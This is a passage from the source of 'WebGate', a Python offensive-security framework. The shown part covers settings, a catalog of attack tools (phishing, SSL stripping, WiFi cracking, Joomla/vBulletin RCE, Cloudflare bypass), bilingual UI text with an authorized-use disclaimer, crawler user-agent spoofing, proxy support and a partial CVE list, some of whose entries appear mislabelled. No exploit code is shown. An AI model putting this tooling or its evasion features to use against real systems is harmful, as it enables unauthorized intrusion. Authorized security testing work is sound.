#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebGate FW3.7 — Domain Security Auditor + Network Agent + Exploit Framework
Created by c3less  |  https://github.com/c3less/webgate
Telegram: @c3less

CLI:   python webgate.py
GUI:   python webgate.py --gui
Quick: python webgate.py -d example.com
Agent: python webgate.py agent
Exploit: python webgate.py exploit <domain>
"""

# ═══════════════════════════════════════════════════════════════
# IMPORTS
# ═══════════════════════════════════════════════════════════════
import sys, os, re, time, socket, ssl, json, threading, argparse
import subprocess, struct, wave, io, math, tempfile, atexit, sqlite3
import ipaddress, random, hashlib, base64, string
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from concurrent.futures import ThreadPoolExecutor, as_completed

# Force X11 for transparency support on Linux/Wayland
if sys.platform.startswith("linux"):
    os.environ.setdefault("GDK_BACKEND", "x11")
    os.environ.setdefault("DISPLAY", ":0")

try:
    import whois;          WHOIS_OK = True
except ImportError:        WHOIS_OK = False
try:
    import dns.resolver, dns.exception; DNS_OK = True
except ImportError:        DNS_OK = False
try:
    import requests;       REQUESTS_OK = True
except ImportError:        REQUESTS_OK = False
try:
    import netifaces;      NETIFACES_OK = True
except ImportError:        NETIFACES_OK = False
try:
    import paramiko;       PARAMIKO_OK = True
except ImportError:        PARAMIKO_OK = False


# ═══════════════════════════════════════════════════════════════
# SETTINGS
# ═══════════════════════════════════════════════════════════════
_SCRIPT_DIR    = os.path.dirname(os.path.realpath(os.path.abspath(__file__)))
_SETTINGS_FILE = os.path.join(_SCRIPT_DIR, "settings.json")
_REPORTS_DIR   = _SCRIPT_DIR
_IS_SYMLINK    = os.path.islink(os.path.abspath(sys.argv[0]))

_DEFAULT_SETTINGS = {
    "lang":         "EN",
    "theme":        "dark",   # always default to vibrant dark
    "sound":        True,
    "transparency": 0.93,
    "custom_theme": {},
    "deep_tools": {
        "nmap": True, "wpscan": True, "sqlmap": True,
        "cmseek": False, "xsstrike": True, "gobuster": True,
        "commix": False, "droopescan": False, "brutex": False,
        "arachni": False, "weeman": False, "sslstrip": False,
        "reaver": False, "pixiewps": False, "cupp": False,
        "wp_plugins": True, "shell_finder": True, "sqli_scan": True,
        "upload_check": True, "gravityforms": True, "joomla_rce": False,
        "vbulletin_rce": False, "bypass_cf": True, "poet": False,
        "port_scan_deep": True, "ssl_audit": True,
        "wordpress_scan": True, "wp_exploit": True,
    },
    "ask_per_port":  False,
    "auto_surface":  True,
}

def load_settings() -> dict:
    try:
        with open(_SETTINGS_FILE) as f:
            s = json.load(f)
            merged = dict(_DEFAULT_SETTINGS)
            merged.update(s)
            if "deep_tools" in s:
                merged["deep_tools"] = {**_DEFAULT_SETTINGS["deep_tools"], **s["deep_tools"]}
            return merged
    except Exception:
        return dict(_DEFAULT_SETTINGS)

def save_settings(s: dict):
    try:
        with open(_SETTINGS_FILE, "w") as f:
            json.dump(s, f, indent=2)
    except Exception:
        pass

SETTINGS = load_settings()


# ═══════════════════════════════════════════════════════════════
# TOOL CATALOG  (30 tools)
# ═══════════════════════════════════════════════════════════════
TOOL_CATALOG = {
    "nmap":          {"label": "Nmap",                "cat": "recon",   "ext": True,  "cmd": "nmap"},
    "wpscan":        {"label": "WPScan",              "cat": "cms",     "ext": True,  "cmd": "wpscan"},
    "sqlmap":        {"label": "SQLMap",              "cat": "sql",     "ext": True,  "cmd": "sqlmap"},
    "cmseek":        {"label": "CMS Scanner",         "cat": "cms",     "ext": True,  "cmd": "cmseek"},
    "xsstrike":      {"label": "XSStrike",            "cat": "xss",     "ext": True,  "cmd": "xsstrike"},
    "gobuster":      {"label": "Dir/Shell Finder",    "cat": "recon",   "ext": True,  "cmd": "gobuster"},
    "commix":        {"label": "Commix (CMDi)",       "cat": "cmdi",    "ext": True,  "cmd": "commix"},
    "droopescan":    {"label": "Drupal Hacking",      "cat": "cms",     "ext": True,  "cmd": "droopescan"},
    "brutex":        {"label": "BruteX",              "cat": "brute",   "ext": True,  "cmd": "brutex"},
    "arachni":       {"label": "Arachni",             "cat": "web",     "ext": True,  "cmd": "arachni"},
    "weeman":        {"label": "Weeman (Phish)",      "cat": "phish",   "ext": True,  "cmd": "weeman"},
    "sslstrip":      {"label": "SSLstrip",            "cat": "mitm",    "ext": True,  "cmd": "sslstrip"},
    "reaver":        {"label": "Reaver (WiFi)",       "cat": "wifi",    "ext": True,  "cmd": "reaver"},
    "pixiewps":      {"label": "Pixiewps (WiFi)",     "cat": "wifi",    "ext": True,  "cmd": "pixiewps"},
    "cupp":          {"label": "Cupp (Wordlist)",     "cat": "osint",   "ext": True,  "cmd": "cupp"},
    "wordpress_scan":{"label": "WordPress Scanner",   "cat": "cms",     "ext": False, "cmd": "internal"},
    "wp_plugins":    {"label": "WP Plugins Scan",     "cat": "cms",     "ext": False, "cmd": "internal"},
    "wp_exploit":    {"label": "WP Exploit Scan",     "cat": "cms",     "ext": False, "cmd": "internal"},
    "gravityforms":  {"label": "Gravity Forms Scan",  "cat": "cms",     "ext": False, "cmd": "internal"},
    "upload_check":  {"label": "File Upload Check",   "cat": "web",     "ext": False, "cmd": "internal"},
    "sqli_scan":     {"label": "SQLi Scanner",        "cat": "sql",     "ext": False, "cmd": "internal"},
    "shell_finder":  {"label": "Shell Finder",        "cat": "recon",   "ext": False, "cmd": "internal"},
    "joomla_rce":    {"label": "Joomla RCE",          "cat": "rce",     "ext": False, "cmd": "internal"},
    "vbulletin_rce": {"label": "vBulletin RCE",       "cat": "rce",     "ext": False, "cmd": "internal"},
    "bypass_cf":     {"label": "Bypass Cloudflare",   "cat": "recon",   "ext": False, "cmd": "internal"},
    "poet":          {"label": "POET",                "cat": "web",     "ext": False, "cmd": "internal"},
    "port_scan_deep":{"label": "Deep Port Scan",      "cat": "recon",   "ext": False, "cmd": "internal"},
    "ssl_audit":     {"label": "SSL Full Audit",      "cat": "ssl",     "ext": False, "cmd": "internal"},
    "inurlbr":       {"label": "Inurlbr (Dork)",      "cat": "osint",   "ext": False, "cmd": "internal"},
    "setoolkit":     {"label": "SET Social Eng.",     "cat": "social",  "ext": True,  "cmd": "setoolkit"},
}

CAT_COLORS = {
    "recon":  "#4a9eff", "cms":   "#ff9f43", "sql":  "#ee5a24",
    "xss":    "#ff6b6b", "cmdi":  "#ff4757", "mitm": "#a29bfe",
    "brute":  "#fd79a8", "web":   "#55efc4", "phish":"#fdcb6e",
    "wifi":   "#74b9ff", "osint": "#81ecec", "rce":  "#d63031",
    "ssl":    "#00b894", "social":"#e17055",
}


# ═══════════════════════════════════════════════════════════════
# TRANSLATIONS
# ═══════════════════════════════════════════════════════════════
TR = {
"EN": {
    "app_title":    "WebGate",
    "app_sub":      "Domain Security Auditor",
    "credit":       "by c3less",
    "instructions": "Enter domain · START SCAN = surface · DEEP SCAN = full pentest",
    "target_lbl":   "TARGET DOMAIN",
    "placeholder":  "example.com  or  192.168.1.1",
    "scan_btn":     "START SCAN",
    "deep_btn":     "DEEP SCAN",
    "cancel_btn":   "CANCEL",
    "settings_btn": "⚙  SETTINGS",
    "exploits_found": "Exploits found",  # placeholder for future use
    "clear_btn":    "✕ CLEAR",
    "scanning":     "SCANNING…",
    "ready":        "READY",
    "complete":     "COMPLETE",
    "cancelled":    "CANCELLED",
    "log_hdr":      "SCAN OUTPUT",
    "status_hdr":   "STATUS",
    "steps_hdr":    "STEPS",
    "tools_hdr":    "TOOLS",
    "stat_status":  "STATUS",
    "stat_target":  "TARGET",
    "stat_ip":      "IP",
    "stat_country": "COUNTRY",
    "stat_ports":   "PORTS",
    "stat_ssl":     "SSL",
    "stat_sec":     "SEC",
    "stat_time":    "TIME",
    "stat_eta":     "ETA",
    "steps": ["DNS Resolve","DNS Records","WHOIS","HTTP Headers",
              "SSL / TLS","Port Scan","CVE Check","Report"],
    "deep_steps": ["Nmap","WPScan","SQLMap","Dir Enum","XSS","CVE Exploit","Report"],
    "summary_title": "SURFACE ANALYSIS",
    "summary_ip":    "IP Address",
    "summary_country":"Country",
    "summary_ssl":   "SSL / TLS",
    "summary_open":  "Open Ports",
    "summary_sec":   "Sec Headers",
    "summary_risk":  "Risk Level",
    "summary_cve":   "CVE Matches",
    "summary_next":  "PROCEED TO DEEP SCAN →",
    "summary_close": "CLOSE",
    "risk_low":      "LOW",
    "risk_medium":   "MEDIUM",
    "risk_high":     "HIGH",
    "risk_critical": "CRITICAL",
    "settings_title":"⚙  Settings",
    "lang_label":    "Language",
    "theme_label":   "Theme",
    "sound_label":   "Typing Sound",
    "alpha_label":   "Transparency",
    "ask_port_label":"Ask before each port",
    "save_btn":      "SAVE",
    "close_btn":     "CLOSE",
    "custom_btn":    "Custom Colors",
    "disc_title":    "⚠  Deep Scan — Authorized Use Only",
    "disc_body": (
        "DISCLAIMER — READ CAREFULLY\n\n"
        "WebGate Deep Scan integrates advanced offensive security tools:\n"
        "SQLMap, Nmap, WPScan, XSStrike, Commix, and many more.\n\n"
        "These tools WILL:\n"
        "  • Send aggressive automated requests to the target\n"
        "  • Trigger IDS/IPS and WAF alerts\n"
        "  • Attempt to exploit discovered vulnerabilities\n"
        "  • Leave traces in server logs\n\n"
        "LEGAL USE ONLY:\n"
        "  ✓ Systems you own or operate\n"
        "  ✓ Authorized penetration testing engagements\n"
        "  ✓ CTF / Lab environments\n\n"
        "UNAUTHORIZED use is a criminal offense under CFAA, CMA,\n"
        "and equivalent laws worldwide.\n\n"
        "By clicking AGREE you accept full legal responsibility."
    ),
    "disc_agree":    "✓  I AGREE — I have written authorization",
    "disc_deny":     "✗  CANCEL",
    "tool_sel_title":"Select Deep Scan Tools",
    "tool_sel_sub":  "Check tools to include in the deep scan:",
    "tool_sel_ask":  "Ask before scanning each port",
    "tool_sel_ok":   "START DEEP SCAN",
    "tool_sel_cancel":"CANCEL",
    "port_ask_title":"Port Scan Confirmation",
    "port_ask_yes":  "YES — Scan",
    "port_ask_no":   "SKIP",
    "port_ask_all":  "YES to ALL remaining",
    "notif_title":   "WebGate — Scan Complete",
    "notif_body":    "Security audit finished for",
    "enter_domain":  "Please enter a target domain or IP.",
    "init_msg":      "WebGate ready — enter a target and press START SCAN",
    "copied":        "Copied to clipboard!",
    "missing_mod":   "Optional modules missing — some features disabled",
},
"RU": {
    "app_title":    "WebGate",
    "app_sub":      "Аудитор безопасности доменов",
    "credit":       "by c3less",
    "instructions": "Домен · СКАН = поверхностный · ГЛУБОКИЙ = пентест",
    "target_lbl":   "ЦЕЛЕВОЙ ДОМЕН",
    "placeholder":  "example.com  или  192.168.1.1",
    "scan_btn":     "НАЧАТЬ СКАН",
    "deep_btn":     "ГЛУБОКИЙ СКАН",
    "cancel_btn":   "ОТМЕНА",
    "settings_btn": "⚙  НАСТРОЙКИ",
    "exploits_found": "Эксплойтов найдено",  # placeholder
    "clear_btn":    "✕ ОЧИСТИТЬ",
    "scanning":     "СКАНИРОВАНИЕ…",
    "ready":        "ГОТОВ",
    "complete":     "ЗАВЕРШЕНО",
    "cancelled":    "ОТМЕНЕНО",
    "log_hdr":      "ВЫВОД СКАНА",
    "status_hdr":   "СТАТУС",
    "steps_hdr":    "ШАГИ",
    "tools_hdr":    "ИНСТРУМЕНТЫ",
    "stat_status":  "СТАТУС",
    "stat_target":  "ЦЕЛЬ",
    "stat_ip":      "IP",
    "stat_country": "СТРАНА",
    "stat_ports":   "ПОРТЫ",
    "stat_ssl":     "SSL",
    "stat_sec":     "ЗАЩ",
    "stat_time":    "ВРЕМЯ",
    "stat_eta":     "ETA",
    "steps": ["DNS Резолюция","DNS Записи","WHOIS","HTTP","SSL / TLS",
              "Скан портов","CVE Проверка","Отчёт"],
    "deep_steps": ["Nmap","WPScan","SQLMap","Dir Enum","XSS","CVE Эксплойт","Отчёт"],
    "summary_title": "ПОВЕРХНОСТНЫЙ АНАЛИЗ",
    "summary_ip":    "IP адрес",
    "summary_country":"Страна",
    "summary_ssl":   "SSL / TLS",
    "summary_open":  "Открытые порты",
    "summary_sec":   "Заголовки защиты",
    "summary_risk":  "Уровень риска",
    "summary_cve":   "CVE совпадений",
    "summary_next":  "НАЧАТЬ ГЛУБОКИЙ СКАН →",
    "summary_close": "ЗАКРЫТЬ",
    "risk_low":      "НИЗКИЙ",
    "risk_medium":   "СРЕДНИЙ",
    "risk_high":     "ВЫСОКИЙ",
    "risk_critical": "КРИТИЧЕСКИЙ",
    "settings_title":"⚙  Настройки",
    "lang_label":    "Язык",
    "theme_label":   "Тема",
    "sound_label":   "Звук печати",
    "alpha_label":   "Прозрачность",
    "ask_port_label":"Спрашивать перед каждым портом",
    "save_btn":      "СОХРАНИТЬ",
    "close_btn":     "ЗАКРЫТЬ",
    "custom_btn":    "Свои цвета",
    "disc_title":    "⚠  Глубокий скан — только авторизованно",
    "disc_body": (
        "ОТКАЗ ОТ ОТВЕТСТВЕННОСТИ — ПРОЧТИТЕ ВНИМАТЕЛЬНО\n\n"
        "Глубокий скан использует мощные инструменты:\n"
        "SQLMap, Nmap, WPScan, XSStrike, Commix и другие.\n\n"
        "Эти инструменты БУДУТ:\n"
        "  • Отправлять агрессивные запросы к цели\n"
        "  • Активировать IDS/IPS и WAF системы\n"
        "  • Пытаться эксплуатировать уязвимости\n"
        "  • Оставлять следы в логах сервера\n\n"
        "РАЗРЕШЁННОЕ ИСПОЛЬЗОВАНИЕ:\n"
        "  ✓ Ваши собственные системы\n"
        "  ✓ Авторизованное тестирование на проникновение\n"
        "  ✓ CTF / Лабораторные среды\n\n"
        "НЕСАНКЦИОНИРОВАННОЕ использование — уголовное преступление.\n\n"
        "Нажимая СОГЛАСЕН вы принимаете полную ответственность."
    ),
    "disc_agree":    "✓  СОГЛАСЕН — у меня есть разрешение",
    "disc_deny":     "✗  ОТМЕНА",
    "tool_sel_title":"Выбор инструментов глубокого скана",
    "tool_sel_sub":  "Отметьте инструменты для глубокого скана:",
    "tool_sel_ask":  "Спрашивать перед сканированием каждого порта",
    "tool_sel_ok":   "НАЧАТЬ ГЛУБОКИЙ СКАН",
    "tool_sel_cancel":"ОТМЕНА",
    "port_ask_title":"Подтверждение сканирования порта",
    "port_ask_yes":  "ДА — Сканировать",
    "port_ask_no":   "ПРОПУСТИТЬ",
    "port_ask_all":  "ДА для ВСЕХ оставшихся",
    "notif_title":   "WebGate — Скан завершён",
    "notif_body":    "Аудит безопасности завершён для",
    "enter_domain":  "Введите целевой домен или IP.",
    "init_msg":      "WebGate v3.0 готов — введите цель и нажмите НАЧАТЬ СКАН",
    "copied":        "Скопировано в буфер!",
    "missing_mod":   "Отсутствуют модули — некоторые функции недоступны",
},
}

def t(key: str) -> str:
    return TR.get(SETTINGS["lang"], TR["EN"]).get(key, key)


# ═══════════════════════════════════════════════════════════════
# THEMES
# ═══════════════════════════════════════════════════════════════
THEMES = {
"dark": {
    "BG":      "#0a0d14", "BG2":    "#0f1220", "BG3":    "#141828",
    "BG4":     "#1a1f32", "BORDER": "#1e2a48", "BORDER2":"#2a4080",
    "BORDER3": "#3a5aaa", "FG":     "#c8d4e8", "FG2":    "#8898b8",
    "FG3":     "#3a4868", "WHITE":  "#e8f0ff", "OFFWHT": "#d0dcf8",
    "BTN_BG":  "#1a6fd4", "BTN_FG": "#ffffff", "BTN_HOV":"#2a8aff",
    "BTN_DIS_BG":"#1a1f32","BTN_DIS_FG":"#3a4868",
    "LOGO_CLR":"#4a9eff", "LOGO_SHD":"#0a1428",
    "ACC":     "#4a9eff", "ACC2":   "#ff6b6b", "ACC3":   "#55efc4",
    "WARN":    "#ffcc00", "ERR":    "#ff4757",
    "LOG_CLR": {"INFO":"#6878a8","FOUND":"#c8d4e8","WARN":"#ffcc00",
                "ERROR":"#ff4757","STEP":"#4a9eff","SUCCESS":"#55efc4"},
},
"light": {
    "BG":      "#f0f0f0", "BG2":    "#e8e8e8", "BG3":    "#dcdcdc",
    "BG4":     "#d0d0d0", "BORDER": "#c0c0c0", "BORDER2":"#999999",
    "BORDER3": "#666666", "FG":     "#1a1a1a", "FG2":    "#555555",
    "FG3":     "#999999", "WHITE":  "#000000", "OFFWHT": "#111111",
    "BTN_BG":  "#111111", "BTN_FG": "#f0f0f0", "BTN_HOV":"#333333",
    "BTN_DIS_BG":"#cccccc","BTN_DIS_FG":"#999999",
    "LOGO_CLR":"#111111", "LOGO_SHD":"#aaaaaa",
    "ACC":     "#0066cc", "ACC2":   "#cc3333", "ACC3":   "#009966",
    "WARN":    "#cc8800", "ERR":    "#cc0000",
    "LOG_CLR": {"INFO":"#888888","FOUND":"#111111","WARN":"#cc8800",
                "ERROR":"#cc0000","STEP":"#0055aa","SUCCESS":"#006633"},
},
"midnight": {
    "BG":      "#05030f", "BG2":    "#0a0820", "BG3":    "#100e2e",
    "BG4":     "#161440", "BORDER": "#1e1c44", "BORDER2":"#3a3878",
    "BORDER3": "#6a68cc", "FG":     "#c0b8f0", "FG2":    "#8880c8",
    "FG3":     "#3a3870", "WHITE":  "#ffffff", "OFFWHT": "#e0d8ff",
    "BTN_BG":  "#c8c0f0", "BTN_FG": "#05030f", "BTN_HOV":"#ffffff",
    "BTN_DIS_BG":"#161440","BTN_DIS_FG":"#4a48a0",
    "LOGO_CLR":"#e0d8ff", "LOGO_SHD":"#1e1c44",
    "ACC":     "#7c6fff", "ACC2":   "#ff6b9d", "ACC3":   "#6dffd8",
    "WARN":    "#ffd166", "ERR":    "#ff4757",
    "LOG_CLR": {"INFO":"#3a3870","FOUND":"#c0b8f0","WARN":"#ffd166",
                "ERROR":"#ff4757","STEP":"#7c6fff","SUCCESS":"#6dffd8"},
},
"hacker": {
    "BG":      "#000000", "BG2":    "#050505", "BG3":    "#0a0a0a",
    "BG4":     "#0f0f0f", "BORDER": "#003300", "BORDER2":"#006600",
    "BORDER3": "#00cc00", "FG":     "#00cc00", "FG2":    "#008800",
    "FG3":     "#004400", "WHITE":  "#00ff00", "OFFWHT": "#00dd00",
    "BTN_BG":  "#003300", "BTN_FG": "#00ff00", "BTN_HOV":"#004400",
    "BTN_DIS_BG":"#050505","BTN_DIS_FG":"#004400",
    "LOGO_CLR":"#00ff00", "LOGO_SHD":"#003300",
    "ACC":     "#00ff88", "ACC2":   "#ff4400", "ACC3":   "#00ffcc",
    "WARN":    "#ffaa00", "ERR":    "#ff2200",
    "LOG_CLR": {"INFO":"#006600","FOUND":"#00cc00","WARN":"#ffaa00",
                "ERROR":"#ff2200","STEP":"#00ff88","SUCCESS":"#00ffcc"},
},
# Pure black & white — zero color, only grayscale
"mono": {
    "BG":      "#000000", "BG2":    "#0a0a0a", "BG3":    "#111111",
    "BG4":     "#1a1a1a", "BORDER": "#2a2a2a", "BORDER2":"#444444",
    "BORDER3": "#888888", "FG":     "#e0e0e0", "FG2":    "#aaaaaa",
    "FG3":     "#555555", "WHITE":  "#ffffff", "OFFWHT": "#dddddd",
    "BTN_BG":  "#ffffff", "BTN_FG": "#000000", "BTN_HOV":"#dddddd",
    "BTN_DIS_BG":"#1a1a1a","BTN_DIS_FG":"#444444",
    "LOGO_CLR":"#ffffff", "LOGO_SHD":"#1a1a1a",
    "ACC":     "#ffffff", "ACC2":   "#aaaaaa", "ACC3":   "#888888",
    "WARN":    "#cccccc", "ERR":    "#ffffff",
    "LOG_CLR": {"INFO":"#555555","FOUND":"#e0e0e0","WARN":"#aaaaaa",
                "ERROR":"#ffffff","STEP":"#cccccc","SUCCESS":"#ffffff"},
},
}

THEME_ORDER = ["dark", "mono", "light", "midnight", "hacker", "custom"]

def get_theme() -> dict:
    name = SETTINGS.get("theme", "dark")
    base = THEMES.get(name, THEMES["dark"]).copy()
    if name == "custom" and SETTINGS.get("custom_theme"):
        base.update(SETTINGS["custom_theme"])
    return base


# ═══════════════════════════════════════════════════════════════
# SOUND
# ═══════════════════════════════════════════════════════════════
_CLICK_FILE  = ""
_last_sound  = 0.0
_SOUND_CMD   = []   # will be detected once

def _detect_audio_cmd():
    """Find first working audio player on this system."""
    global _SOUND_CMD
    if sys.platform == "darwin":
        _SOUND_CMD = ["afplay"]; return
    # Linux: try in order of preference
    candidates = [
        ["pw-play"],            # PipeWire native
        ["paplay"],             # PulseAudio
        ["aplay", "-q"],        # ALSA
        ["mpv", "--really-quiet", "--no-video"],   # mpv
        ["ffplay", "-nodisp", "-autoexit", "-loglevel", "quiet"],
        ["cvlc", "--play-and-exit", "--quiet"],
        ["sox", "--null", "--null"],  # sox (will fail but safe)
    ]
    for cmd in candidates:
        try:
            if subprocess.run(["which", cmd[0]],
                    capture_output=True, timeout=2).returncode == 0:
                _SOUND_CMD = cmd; return
        except Exception:
            continue

def _init_sound():
    global _CLICK_FILE
    _detect_audio_cmd()
    try:
        sr   = 22050
        dur  = 0.022          # 22 ms — longer = louder
        n    = int(sr * dur)
        buf  = io.BytesIO()
        with wave.open(buf, 'wb') as w:
            w.setnchannels(1); w.setsampwidth(2); w.setframerate(sr)
            frames = []
            for i in range(n):
                t_ = i / sr
                # Two-tone click: sharp 3kHz + soft 1.2kHz body
                env  = (1 - t_ / dur) ** 1.5
                tone = (math.sin(2 * math.pi * 3000 * t_) * 0.6 +
                        math.sin(2 * math.pi * 1200 * t_) * 0.4)
                amp  = int(28000 * env * tone)
                frames.append(struct.pack('<h', max(-32767, min(32767, amp))))
            w.writeframes(b''.join(frames))
        fd, path = tempfile.mkstemp(suffix='.wav')
        with os.fdopen(fd, 'wb') as f:
            f.write(buf.getvalue())
        _CLICK_FILE = path
        atexit.register(lambda: os.path.exists(path) and os.unlink(path))
    except Exception:
        pass

def play_click():
    global _last_sound
    if not SETTINGS.get("sound") or not _CLICK_FILE or not _SOUND_CMD:
        return
    now = time.time()
    if now - _last_sound < 0.04:
        return
    _last_sound = now
    try:
        subprocess.Popen(_SOUND_CMD + [_CLICK_FILE],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True)
    except Exception:
        pass

def send_notification(title: str, body: str):
    try:
        if sys.platform.startswith("linux"):
            subprocess.Popen(["notify-send", title, body,
                "--icon=dialog-information", "--expire-time=6000"])
        elif sys.platform == "darwin":
            subprocess.Popen(["osascript", "-e",
                f'display notification "{body}" with title "{title}"'])
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# TERMINAL COLORS (CLI)
# ═══════════════════════════════════════════════════════════════
class C:
    RST='\033[0m'; BOLD='\033[1m'; DIM='\033[2m'; ITAL='\033[3m'
    WHT='\033[97m'; GRY='\033[90m'; LGRY='\033[37m'
    CYN='\033[96m'; GRN='\033[92m'; YLW='\033[93m'; RED='\033[91m'
    BLU='\033[94m'; MGT='\033[95m'
    @classmethod
    def disable(cls):
        for a in list(vars(cls)):
            if not a.startswith('_') and isinstance(getattr(cls, a), str):
                setattr(cls, a, '')

if not sys.stdout.isatty(): C.disable()
elif os.name == 'nt':
    try: import colorama; colorama.init()
    except ImportError: C.disable()

BANNER = f"""\
{C.BOLD}{C.WHT}
██╗    ██╗███████╗██████╗  ██████╗  █████╗ ████████╗███████╗
██║    ██║██╔════╝██╔══██╗██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
██║ █╗ ██║█████╗  ██████╔╝██║  ███╗███████║   ██║   █████╗
██║███╗██║██╔══╝  ██╔══██╗██║   ██║██╔══██║   ██║   ██╔══╝
╚███╔███╔╝███████╗██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗
 ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
{C.RST}{C.DIM}
  ┌──────────────────────────────────────────────────────────────┐
  │  Domain Security Auditor  │ FW3.7  │  by c3less               │
  │  DNS · WHOIS · SSL · Ports · CVE · Agent · Exploit · 40 Tools │
  └──────────────────────────────────────────────────────────────┘
{C.RST}"""


# ═══════════════════════════════════════════════════════════════
# USER-AGENT ROTATION & PROXY
# ═══════════════════════════════════════════════════════════════
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)

_PROXY_CONFIG = {"http": None, "https": None}

def set_proxy(proxy_url: str):
    """Set HTTP/SOCKS proxy. Format: http://host:port or socks5://host:port"""
    _PROXY_CONFIG["http"] = proxy_url
    _PROXY_CONFIG["https"] = proxy_url

def get_proxy_handler():
    """Return urllib proxy handler if proxy is configured."""
    if _PROXY_CONFIG["http"]:
        from urllib.request import ProxyHandler
        return ProxyHandler({
            "http": _PROXY_CONFIG["http"],
            "https": _PROXY_CONFIG["https"],
        })
    return None


# ═══════════════════════════════════════════════════════════════
# CVE DATABASE — 200+ entries with CVSS scores
# ═══════════════════════════════════════════════════════════════
_CVE_DB_PATH = os.path.join(_SCRIPT_DIR, "cve.db")

CVE_DATA = [
    # nginx
    ("nginx","CVE-2021-23017","Buffer overflow via DNS resolver, CVSS 9.4 — RCE possible"),
    ("nginx","CVE-2019-20372","HTTP request smuggling via malformed Transfer-Encoding"),
    ("nginx","CVE-2017-7529","Integer overflow in range filter, CVSS 7.5 — info leak"),
    ("nginx","CVE-2016-0747","Resolver memory corruption — CVSS 5.0"),
    ("nginx","CVE-2013-2070","Proxy response body corruption via chunked encoding"),
    # apache
    ("apache","CVE-2021-41773","Path traversal + RCE on Apache 2.4.49 — CVSS 9.8"),
    ("apache","CVE-2021-42013","Path traversal bypass of CVE-2021-41773 fix — CVSS 9.8"),
    ("apache","CVE-2020-11984","mod_uwsgi buffer overflow — CVSS 9.8"),
    ("apache","CVE-2019-0211","Local privilege escalation via scoreboard — CVSS 7.8"),
    ("apache","CVE-2017-7679","mod_mime buffer over-read — CVSS 9.8"),
    ("apache","CVE-2017-9798","Optionsbleed — OPTIONS method memory leak"),
    ("apache","CVE-2022-22720","HTTP request smuggling via malformed chunked body"),
    ("apache","CVE-2022-31813","Forwarded header bypass — CVSS 9.8"),
    # IIS
    ("iis","CVE-2021-31166","HTTP Protocol Stack RCE — CVSS 9.8, wormable"),
    ("iis","CVE-2017-7269","WebDAV ScStoragePathFromUrl overflow — CVSS 10.0 RCE"),
    ("iis","CVE-2015-1635","HTTP.sys RCE (MS15-034) — CVSS 9.8"),
    ("iis","CVE-2022-21907","HTTP Protocol Stack RCE — CVSS 9.8"),
    # PHP
    ("php","CVE-2019-11043","PHP-FPM env_path_info underflow RCE — CVSS 9.8"),
    ("php","CVE-2021-21708","UAF in PDO SQLite — CVSS 9.8"),
    ("php","CVE-2022-31625","Uninitialized array in pg_query_params — CVSS 9.8"),
    ("php","CVE-2022-31626","Heap BOF via mysqlnd — CVSS 9.8"),
    ("php","CVE-2016-10033","PHPMailer RCE via mail() — CVSS 9.8"),
    ("php","CVE-2021-21704","FTP wrapper null dereference — CVSS 5.9"),
    # Python/Django/Flask
    ("python","CVE-2022-42966","Django SQL injection via annotate — CVSS 7.5"),
    ("python","CVE-2021-44420","Django bypass URL validation — CVSS 7.3"),
    ("django","CVE-2023-36053","ReDoS in EmailValidator — CVSS 7.5"),
    ("django","CVE-2022-28346","SQL injection via QuerySet.annotate — CVSS 9.8"),
    ("flask","CVE-2018-1000656","Werkzeug path traversal — CVSS 7.5"),
    # MySQL
    ("mysql","CVE-2021-2307","MySQL Server priv escalation — CVSS 6.1"),
    ("mysql","CVE-2020-14765","MySQL Server DoS — CVSS 6.5"),
    ("mysql","CVE-2020-14812","MySQL InnoDB priv escalation — CVSS 4.9"),
    ("mysql","CVE-2016-6662","Config file injection — CVSS 9.8, RCE"),
    ("mysql","CVE-2012-2122","Auth bypass via timing attack — CVSS 5.1"),
    ("mysql","CVE-2021-22929","MySQL Shell code injection — CVSS 8.8"),
    # MariaDB
    ("mariadb","CVE-2022-27376","Auth bypass via malloc — CVSS 9.8"),
    ("mariadb","CVE-2021-46668","Denial of service in Item_func_in — CVSS 6.5"),
    # PostgreSQL
    ("postgresql","CVE-2023-2454","Extension script injection — CVSS 7.2"),
    ("postgresql","CVE-2022-2625","Extension escalation via CREATE EXTENSION — CVSS 8.0"),
    ("postgresql","CVE-2021-23214","MITM SSL injection — CVSS 8.1"),
    ("postgresql","CVE-2019-10208","SQL injection via type name — CVSS 8.8"),
    ("postgresql","CVE-2018-1058","Schema injection RCE — CVSS 8.8"),
    # MongoDB
    ("mongodb","CVE-2021-32036","Denial of service via crafted aggregation — CVSS 6.5"),
    ("mongodb","CVE-2020-7921","Improper serialization — info leak CVSS 5.9"),
    ("mongodb","CVE-2019-20149","Operator injection via $where — CVSS 7.5"),
    # Redis
    ("redis","CVE-2022-0543","Lua sandbox escape — CVSS 10.0 RCE"),
